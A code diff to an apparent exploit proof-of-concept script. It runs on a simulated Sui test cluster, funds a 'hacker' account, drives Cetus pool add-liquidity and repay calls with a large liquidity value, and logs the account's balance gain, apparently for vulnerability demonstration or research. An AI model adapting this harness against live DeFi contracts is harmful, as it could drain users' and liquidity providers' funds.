@@ -23,10 +23,10 @@ let { for } = import! std.traversable
 let { parse } = import! lancer.parse
 let { TypeTag, StructTag, ? } = import! lancer.sui.types
 let { SuiAddress, ? } = import! lancer.sui.sui_address
-let { Digest, ? } = import! lancer.sui.digest
+let digest @ { Digest, ? } = import! lancer.sui.digest
 let { Coin, coin_to_bytes } = import! lancer.framework
 let { Owner, ? } = import! lancer.rpc.types
-let { from_int } = import! lancer.types.uint
+let { from_int, UInt, ? } = import! lancer.types.uint
 
 let {
     TestCluster,
@@ -53,7 +53,9 @@ let {
     publish_upgradeable,
     publish_immutable,
     move_call,
+    nest_result,
     pay,
+    split_coin,
 } = import! lancer.effect.transaction_builder
 
 let sui_framework : SuiAddress = unwrap_ok <| parse "0x0000000000000000000000000000000000000000000000000000000000000002"
@@ -94,36 +96,10 @@ for objects <| \entry ->
 
 do hacker = generate_keypair
 
-let hackers_sui_id : SuiAddress = unwrap_ok <| parse "0xd335e8aa19d6dc04273d77e364c936bad69db4905a4ab3b2733d644dd2b31e0a"
-let hackers_sui_digest : Digest = unwrap_ok <| parse "xPxJ2Mc8nAJrSJoKy3chKSjCFuhcAruh95MPoZ6s2iW"
-
-let hackers_sui_object = from_inner_object {
-    data = Move {
-        type_ = {
-            address = sui_framework,
-            module = "coin",
-            name = "Coin",
-            type_params = [Struct sui_type],
-        },
-        version = 1,
-        contents = coin_to_bytes {
-            id = {
-                id = hackers_sui_id,
-            },
-            balance = {
-                value = 100000000000,
-            }
-        },
-    },
-    owner = AddressOwner hacker,
-    previous_transaction = hackers_sui_digest,
-    storage_rebate = 0,
-}
-
-add_object hackers_sui_object
 
 let hackers_vsui_id : SuiAddress = unwrap_ok <| parse "0x1b444811bdb14c1689c46012231d7a86e672327f75034a14784a3846482d5c09"
-let hackers_vsui_digest : Digest = unwrap_ok <| parse "xPxJ2Mc8nAJrSJoKy3chKSjCFuhcAruh95MPoZ6s2iW"
+
+let initial_vsui_balance = 1000000000000
 
 let hackers_vsui_object = from_inner_object {
     data = Move {
@@ -139,16 +115,45 @@ let hackers_vsui_object = from_inner_object {
                 id = hackers_vsui_id,
             },
             balance = {
-                value = 100000000000,
+                value = initial_vsui_balance,
             }
         },
     },
     owner = AddressOwner hacker,
-    previous_transaction = hackers_vsui_digest,
+    previous_transaction = digest.zero,
     storage_rebate = 0,
 }
 
 add_object hackers_vsui_object
+
+let hackers_sui_id : SuiAddress = unwrap_ok <| parse "0xd335e8aa19d6dc04273d77e364c936bad69db4905a4ab3b2733d644dd2b31e0a"
+
+let initial_sui_balance = 100000000000
+
+let hackers_sui_object = from_inner_object {
+    data = Move {
+        type_ = {
+            address = sui_framework,
+            module = "coin",
+            name = "Coin",
+            type_params = [Struct sui_type],
+        },
+        version = 1,
+        contents = coin_to_bytes {
+            id = {
+                id = hackers_sui_id,
+            },
+            balance = {
+                value = initial_sui_balance,
+            }
+        },
+    },
+    owner = AddressOwner hacker,
+    previous_transaction = digest.zero,
+    storage_rebate = 0,
+}
+
+add_object hackers_sui_object
 
 initialize
 
@@ -159,10 +164,13 @@ do admin = generate_keypair
 commit_preparation [hacker]
 
 do hackers_sui_data = get_object hackers_sui_id
+do hackers_vsui_data = get_object hackers_vsui_id
 
 log <| "Pool owner: " ++ show pool.owner
 log <| "Pool id: " ++ (show <| object_id <| from_inner_object pool)
-log "ooo"
+
+let delata_liquidity : UInt = unwrap_ok <| parse "200000000000"
+
 do r = execute_tx 500000000 hacker (
     do global_config_arg = object_ref <| SharedObject {
         id = global_config_id,
@@ -183,7 +191,7 @@ do r = execute_tx 500000000 hacker (
         tick_lower_arg,
         tick_upper_arg
     ]
-    do delta_liquidity_arg = u128 <| unwrap_ok <| from_int 10000
+    do delta_liquidity_arg = u128 delata_liquidity
     do clock_arg = object_ref <| SharedObject {
         id = clock_id,
         initial_shared_version = 1,
@@ -196,13 +204,24 @@ do r = execute_tx 500000000 hacker (
         delta_liquidity_arg,
         clock_arg
     ]
-    do vsui_coin_arg = object_ref <| ImmOrOwnedObject (hackers_vsui_id, 1, hackers_vsui_digest)
-    do sui_coin_arg = object_ref <| ImmOrOwnedObject (hackers_sui_id, 1, hackers_sui_digest)
+    do receipt_amounts_args = move_call cetus "pool" "add_liquidity_pay_amount" [  Struct vsui_type, Struct sui_type ] [
+        add_liquidity_receipt_arg
+    ]
+    do vsui_coin_arg = object_ref <| ImmOrOwnedObject <| object_reference <| from_inner_object hackers_vsui_data
+    do vsui_payment_coin_arg = split_coin vsui_coin_arg [nest_result receipt_amounts_args 0]
+    do vsui_payment_balance_arg = move_call sui_framework "coin" "into_balance" [Struct vsui_type] [
+        vsui_payment_coin_arg
+    ]
+    do sui_coin_arg = object_ref <| ImmOrOwnedObject <| object_reference <| from_inner_object hackers_sui_data
+    do sui_payment_coin_arg = split_coin sui_coin_arg [nest_result receipt_amounts_args 1]
+    do sui_payment_balance_arg = move_call sui_framework "coin" "into_balance" [Struct sui_type] [
+        sui_payment_coin_arg
+    ]
     move_call cetus "pool" "repay_add_liquidity" [  Struct vsui_type, Struct sui_type ] [
         global_config_arg,
         pool_arg,
-        vsui_coin_arg,
-        sui_coin_arg,
+        vsui_payment_balance_arg,
+        sui_payment_balance_arg,
         add_liquidity_receipt_arg
     ]
     do hacker_arg = address hacker
@@ -210,8 +229,30 @@ do r = execute_tx 500000000 hacker (
         position_arg,
         hacker_arg,
     ]
+    move_call sui_framework "transfer" "public_transfer" [Struct {
+            address = sui_framework,
+            module = "coin",
+            name = "Coin",
+            type_params = [Struct vsui_type],
+        }] [
+        vsui_coin_arg,
+        hacker_arg,
+    ]
+    move_call sui_framework "transfer" "public_transfer" [Struct {
+            address = sui_framework,
+            module = "coin",
+            name = "Coin",
+            type_params = [Struct sui_type],
+        }] [
+        sui_coin_arg,
+        hacker_arg,
+    ]
 
     // pay [object_reference <| from_inner_object hackers_sui_data] [1000000000] [admin]
 )
+do vsui_balance = get_balance vsui_type hacker
+do sui_balance = get_balance sui_type hacker
+log <| "delta vsui: " ++ show (vsui_balance - initial_vsui_balance)
+log <| "delta sui: " ++ show (sui_balance - initial_sui_balance)
 
 commit_demonstration "" Public
